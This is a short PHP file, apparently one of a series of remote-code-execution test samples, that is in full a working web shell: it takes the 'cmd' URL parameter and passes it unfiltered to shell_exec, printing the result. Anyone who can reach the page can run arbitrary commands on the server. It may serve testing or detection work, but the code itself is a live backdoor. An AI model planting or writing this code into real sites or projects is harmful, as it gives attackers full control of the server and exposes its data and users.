<?php
// RCE test variation #5
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>